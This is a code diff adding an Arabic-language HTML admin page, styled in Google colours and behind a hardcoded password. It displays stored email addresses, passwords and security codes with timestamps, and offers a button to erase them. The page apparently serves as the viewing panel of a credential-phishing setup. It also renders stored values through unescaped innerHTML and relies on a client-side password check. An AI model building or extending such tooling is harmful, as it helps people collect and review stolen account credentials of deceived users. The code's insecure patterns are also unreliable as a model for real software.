@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>البيانات المدخلة</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f4f4;
+      padding: 20px;
+      direction: rtl;
+    }
+
+    h1 {
+      text-align: center;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      background: white;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+
+    th, td {
+      padding: 12px;
+      border: 1px solid #ccc;
+      text-align: center;
+    }
+
+    th {
+      background-color: #4285f4;
+      color: white;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .login {
+      text-align: center;
+      margin-top: 100px;
+    }
+
+    input[type="password"] {
+      padding: 10px;
+      font-size: 16px;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #4285f4;
+      color: white;
+      border: none;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .clear-button {
+      background-color: #e74c3c;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="login" id="loginSection">
+  <h2>أدخل كلمة المرور للوصول</h2>
+  <input type="password" id="adminPass" placeholder="كلمة المرور">
+  <br>
+  <button onclick="checkPassword()">دخول</button>
+</div>
+
+<div class="hidden" id="dataSection">
+  <h1>جميع البيانات المدخلة</h1>
+  <table id="dataTable">
+    <thead>
+      <tr>
+        <th>البريد الإلكتروني</th>
+        <th>كلمة المرور</th>
+        <th>رمز الأمان</th>
+        <th>الوقت</th>
+      </tr>
+    </thead>
+    <tbody></tbody>
+  </table>
+  <button class="clear-button" onclick="clearData()">مسح جميع البيانات المسجلة</button>
+</div>
+
+<script>
+  const PASSWORD = "11221122"; // كلمة المرور الجديدة
+
+  function checkPassword() {
+    const input = document.getElementById("adminPass").value;
+    if (input === PASSWORD) {
+      document.getElementById("loginSection").style.display = "none";
+      document.getElementById("dataSection").classList.remove("hidden");
+      loadData();
+    } else {
+      alert("كلمة المرور غير صحيحة!");
+    }
+  }
+
+  function loadData() {
+    const tableBody = document.querySelector("#dataTable tbody");
+    const entries = JSON.parse(localStorage.getItem('entries') || '[]');
+
+    if (entries.length === 0) {
+      tableBody.innerHTML = "<tr><td colspan='4'>لا توجد بيانات بعد</td></tr>";
+      return;
+    }
+
+    entries.forEach(entry => {
+      const row = document.createElement("tr");
+      row.innerHTML = `
+        <td>${entry.email}</td>
+        <td>${entry.password || ''}</td>
+        <td>${entry.securityCode}</td>
+        <td>${entry.time}</td>
+      `;
+      tableBody.appendChild(row);
+    });
+  }
+
+  function clearData() {
+    if (confirm("هل أنت متأكد أنك تريد مسح جميع البيانات المسجلة؟")) {
+      localStorage.removeItem('entries');  // مسح البيانات من localStorage
+      loadData(); // تحديث الجدول بعد مسح البيانات
+    }
+  }
+</script>
+
+</body>
+</html>
